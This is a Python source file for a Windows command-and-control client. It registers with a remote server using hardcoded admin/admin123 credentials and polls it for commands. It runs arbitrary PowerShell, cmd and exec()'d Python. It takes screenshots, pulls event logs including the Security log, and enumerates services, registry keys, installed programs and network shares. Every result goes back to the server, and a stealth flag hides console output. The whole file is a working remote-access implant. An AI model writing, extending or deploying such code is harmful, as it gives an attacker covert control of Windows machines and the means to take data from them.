#!/usr/bin/env python3
"""
Windows-specific C2 Client
Specialized client for Windows systems with Windows-specific capabilities
"""

import requests
import json
import time
import platform
import socket
import subprocess
import threading
import uuid
import base64
import os
import sys
import psutil
import logging
import winreg
import ctypes
from datetime import datetime
from pathlib import Path
import argparse
import signal
import tempfile
import shutil

# Windows-specific imports
try:
    import win32api
    import win32con
    import win32gui
    import win32process
    import win32security
    import win32service
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False

try:
    from PIL import Image
    import pyautogui
    SCREENSHOT_AVAILABLE = True
except ImportError:
    SCREENSHOT_AVAILABLE = False

class WindowsC2Client:
    def __init__(self, server_url="http://localhost:8000", client_id=None, stealth_mode=False):
        self.server_url = server_url
        self.client_id = client_id or "win_{}".format(uuid.uuid4().hex[:8])
        self.session = requests.Session()
        self.running = False
        self.stealth_mode = stealth_mode
        
        # Setup logging
        self.setup_logging()
        
        # Create temp directory
        self.temp_dir = tempfile.mkdtemp(prefix="c2_win_")
        self.logger.info("Windows client temp directory: {}".format(self.temp_dir))
    
    def setup_logging(self):
        """Setup logging for the client"""
        log_file = os.path.join(self.temp_dir, "windows_client.log") if hasattr(self, 'temp_dir') else "windows_client.log"
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(log_file),
                logging.StreamHandler() if not self.stealth_mode else logging.NullHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
    
    def get_system_info(self):
        """Get Windows-specific system information"""
        try:
            hostname = socket.gethostname()
            username = os.getenv('USERNAME', 'unknown')
            os_info = "{} {} {}".format(platform.system(), platform.release(), platform.version())
            
            # Get local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            try:
                s.connect(("8.8.8.8", 80))
                ip_address = s.getsockname()[0]
            except Exception:
                ip_address = "127.0.0.1"
            finally:
                s.close()
            
            # Get Windows-specific info
            system_info = {
                "agent_id": self.client_id,  # Changed from client_id to agent_id
                "hostname": hostname,
                "username": username,
                "os_info": os_info,
                "ip_address": ip_address,
                "port": 0,
                "platform": "windows",
                "architecture": platform.architecture()[0],
                "machine": platform.machine(),
                "processor": platform.processor(),
                "python_version": sys.version,
                "pid": os.getpid(),
                "cwd": os.getcwd(),
                "is_admin": self.is_admin(),
                "windows_version": platform.version(),
                "computer_name": os.environ.get('COMPUTERNAME', 'unknown'),
                "user_domain": os.environ.get('USERDOMAIN', 'unknown')
            }
            
            # Add Windows-specific details if win32 is available
            if WIN32_AVAILABLE:
                try:
                    system_info.update({
                        "windows_build": win32api.GetVersionEx()[2],
                        "windows_major": win32api.GetVersionEx()[0],
                        "windows_minor": win32api.GetVersionEx()[1]
                    })
                except Exception:
                    pass
            
            return system_info
        except Exception as e:
            self.logger.error("Error getting system info: {}".format(e))
            return None
    
    def is_admin(self):
        """Check if running as administrator"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except Exception:
            return False
    
    def register(self):
        """Register with the C2 server"""
        system_info = self.get_system_info()
        if not system_info:
            return False
        
        try:
            # First login to get authentication token
            login_data = {
                "username": "admin",
                "password": "admin123"
            }
            
            login_response = self.session.post(
                "{}/api/auth/login".format(self.server_url),
                json=login_data
            )
            
            if login_response.status_code != 200:
                self.logger.error("Login failed: {}".format(login_response.text))
                return False
            
            token = login_response.json()["access_token"]
            self.session.headers.update({"Authorization": "Bearer {}".format(token)})
            
            # Now register the agent
            response = self.session.post(
                "{}/api/agents/register".format(self.server_url),
                json=system_info
            )
            
            if response.status_code == 200:
                self.logger.info("Successfully registered as Windows client {}".format(self.client_id))
                return True
            else:
                self.logger.error("Registration failed: {}".format(response.text))
                return False
        except Exception as e:
            self.logger.error("Registration error: {}".format(e))
            return False
    
    def send_heartbeat(self):
        """Send heartbeat to server"""
        try:
            response = self.session.post(
                "{}/api/agents/{}/heartbeat".format(self.server_url, self.client_id)
            )
            return response.status_code == 200
        except Exception as e:
            self.logger.error("Heartbeat error: {}".format(e))
            return False
    
    def get_commands(self):
        """Get pending commands from server"""
        try:
            response = self.session.get(
                "{}/api/commands/{}".format(self.server_url, self.client_id)
            )
            
            if response.status_code == 200:
                data = response.json()
                return data.get("commands", [])
            else:
                return []
        except Exception as e:
            self.logger.error("Error getting commands: {}".format(e))
            return []
    
    def execute_command(self, command, command_type="shell"):
        """Execute a command with Windows-specific handling"""
        try:
            if command_type == "shell":
                # Use PowerShell for better Windows compatibility
                if command.startswith("cmd:"):
                    cmd = command[4:]  # Remove "cmd:" prefix
                    result = subprocess.run(
                        ["cmd", "/c", cmd],
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                else:
                    # Use PowerShell by default
                    result = subprocess.run(
                        ["powershell", "-Command", command],
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                
                output = result.stdout + result.stderr
                success = result.returncode == 0
                
                return {
                    "result": output,
                    "success": success,
                    "return_code": result.returncode
                }
            elif command_type == "python":
                try:
                    exec_globals = {"__builtins__": __builtins__}
                    exec_locals = {}
                    exec(command, exec_globals, exec_locals)
                    return {
                        "result": "Python code executed successfully",
                        "success": True,
                        "return_code": 0
                    }
                except Exception as e:
                    return {
                        "result": "Python execution error: {}".format(str(e)),
                        "success": False,
                        "return_code": 1
                    }
            else:
                return {
                    "result": "Unknown command type: {}".format(command_type),
                    "success": False,
                    "return_code": 1
                }
        except subprocess.TimeoutExpired:
            return {
                "result": "Command timed out",
                "success": False,
                "return_code": 124
            }
        except Exception as e:
            return {
                "result": "Error executing command: {}".format(str(e)),
                "success": False,
                "return_code": 1
            }
    
    def take_screenshot(self):
        """Take a screenshot using Windows-specific methods"""
        if not SCREENSHOT_AVAILABLE:
            return {
                "result": "Screenshot libraries not available. Install with: pip install Pillow pyautogui",
                "success": False
            }
        
        try:
            screenshot = pyautogui.screenshot()
            
            # Save to temp file
            screenshot_path = os.path.join(self.temp_dir, "screenshot_{}.png".format(int(time.time())))
            screenshot.save(screenshot_path)
            
            # Convert to base64
            with open(screenshot_path, "rb") as f:
                image_data = base64.b64encode(f.read()).decode('utf-8')
            
            # Clean up temp file
            os.remove(screenshot_path)
            
            return {
                "result": "Screenshot captured successfully",
                "success": True,
                "image_data": image_data,
                "timestamp": datetime.now().isoformat(),
                "resolution": screenshot.size
            }
        except Exception as e:
            return {
                "result": "Screenshot error: {}".format(str(e)),
                "success": False
            }
    
    def get_windows_logs(self, log_type="system", lines=100):
        """Get Windows Event Logs"""
        try:
            if log_type == "system":
                cmd = "Get-WinEvent -LogName System -MaxEvents {} | Format-Table -Wrap".format(lines)
            elif log_type == "application":
                cmd = "Get-WinEvent -LogName Application -MaxEvents {} | Format-Table -Wrap".format(lines)
            elif log_type == "security":
                cmd = "Get-WinEvent -LogName Security -MaxEvents {} | Format-Table -Wrap".format(lines)
            else:
                cmd = "Get-WinEvent -ListLog * | Where-Object {$_.LogName -like '*{}*'} | Get-WinEvent -MaxEvents {} | Format-Table -Wrap".format(log_type, lines)
            
            result = subprocess.run(
                ["powershell", "-Command", cmd],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            return {
                "result": result.stdout,
                "success": result.returncode == 0,
                "log_type": log_type,
                "lines": lines
            }
        except Exception as e:
            return {
                "result": "Windows log collection error: {}".format(str(e)),
                "success": False
            }
    
    def get_services(self):
        """Get Windows services"""
        try:
            cmd = "Get-Service | Select-Object Name, Status, StartType, DisplayName | Format-Table -Wrap"
            result = subprocess.run(
                ["powershell", "-Command", cmd],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                "result": result.stdout,
                "success": result.returncode == 0,
                "type": "services"
            }
        except Exception as e:
            return {
                "result": "Services enumeration error: {}".format(str(e)),
                "success": False
            }
    
    def get_registry_info(self, key_path="HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"):
        """Get Windows registry information"""
        try:
            cmd = "Get-ItemProperty -Path '{}' | Format-List".format(key_path)
            result = subprocess.run(
                ["powershell", "-Command", cmd],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                "result": result.stdout,
                "success": result.returncode == 0,
                "registry_path": key_path
            }
        except Exception as e:
            return {
                "result": "Registry access error: {}".format(str(e)),
                "success": False
            }
    
    def get_installed_programs(self):
        """Get installed programs"""
        try:
            cmd = "Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor | Format-Table -Wrap"
            result = subprocess.run(
                ["powershell", "-Command", cmd],
                capture_output=True,
                text=True,
                timeout=60
            )
            
            return {
                "result": result.stdout,
                "success": result.returncode == 0,
                "type": "installed_programs"
            }
        except Exception as e:
            return {
                "result": "Installed programs enumeration error: {}".format(str(e)),
                "success": False
            }
    
    def get_network_shares(self):
        """Get network shares"""
        try:
            cmd = "Get-WmiObject -Class Win32_Share | Select-Object Name, Path, Type, Description | Format-Table -Wrap"
            result = subprocess.run(
                ["powershell", "-Command", cmd],
                capture_output=True,
                text=True,
                timeout=30
            )
            
            return {
                "result": result.stdout,
                "success": result.returncode == 0,
                "type": "network_shares"
            }
        except Exception as e:
            return {
                "result": "Network shares enumeration error: {}".format(str(e)),
                "success": False
            }
    
    def submit_result(self, command_id, result, success, additional_data=None):
        """Submit command result to server"""
        try:
            result_data = {
                "agent_id": self.client_id,
                "command_id": command_id,
                "result": result,
                "success": success,
                "timestamp": datetime.utcnow().isoformat()
            }
            
            if additional_data:
                result_data.update(additional_data)
            
            response = self.session.post(
                "{}/api/commands/result".format(self.server_url),
                json=result_data
            )
            
            return response.status_code == 200
        except Exception as e:
            self.logger.error("Error submitting result: {}".format(e))
            return False
    
    def process_commands(self):
        """Process pending commands with Windows-specific handling"""
        commands = self.get_commands()
        
        for cmd in commands:
            if cmd.get("status") == "pending":
                self.logger.info("Executing command: {}".format(cmd['command']))
                
                command_type = cmd.get("command_type", "shell")
                command_text = cmd['command']
                
                # Handle Windows-specific commands
                if command_text.startswith("SCREENSHOT"):
                    result_data = self.take_screenshot()
                elif command_text.startswith("WINDOWS_LOGS"):
                    parts = command_text.split()
                    log_type = parts[1] if len(parts) > 1 else "system"
                    lines = int(parts[2]) if len(parts) > 2 else 100
                    result_data = self.get_windows_logs(log_type, lines)
                elif command_text.startswith("SERVICES"):
                    result_data = self.get_services()
                elif command_text.startswith("REGISTRY"):
                    key_path = command_text.split(" ", 1)[1] if " " in command_text else "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion"
                    result_data = self.get_registry_info(key_path)
                elif command_text.startswith("PROGRAMS"):
                    result_data = self.get_installed_programs()
                elif command_text.startswith("SHARES"):
                    result_data = self.get_network_shares()
                else:
                    result_data = self.execute_command(command_text, command_type)
                
                self.submit_result(
                    cmd["command_id"],
                    result_data["result"],
                    result_data["success"],
                    result_data
                )
                
                self.logger.info("Command result: {}".format(result_data['success']))
    
    def cleanup(self):
        """Cleanup resources"""
        try:
            # Clean up temp directory
            if os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
            
            self.logger.info("Windows client cleanup completed")
        except Exception as e:
            self.logger.error("Cleanup error: {}".format(e))
    
    def run(self):
        """Main client loop"""
        self.logger.info("Starting Windows C2 Client {}".format(self.client_id))
        
        # Register with server
        if not self.register():
            self.logger.error("Failed to register with server. Exiting.")
            return
        
        self.running = True
        
        # Setup signal handlers for graceful shutdown
        def signal_handler(signum, frame):
            self.logger.info("Received signal {}, shutting down...".format(signum))
            self.running = False
        
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
        
        try:
            while self.running:
                # Send heartbeat
                self.send_heartbeat()
                
                # Process commands
                self.process_commands()
                
                # Wait before next iteration
                time.sleep(5)
                
        except KeyboardInterrupt:
            self.logger.info("Client stopped by user")
        except Exception as e:
            self.logger.error("Client error: {}".format(e))
        finally:
            self.running = False
            self.cleanup()

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="Windows C2 Client")
    parser.add_argument("--server", default="http://localhost:8000", help="C2 Server URL")
    parser.add_argument("--client-id", help="Custom client ID")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    
    args = parser.parse_args()
    
    client = WindowsC2Client(
        server_url=args.server,
        client_id=args.client_id,
        stealth_mode=args.stealth
    )
    
    try:
        client.run()
    except Exception as e:
        print("Windows client error: {}".format(e))
        sys.exit(1)

if __name__ == "__main__":
    main()
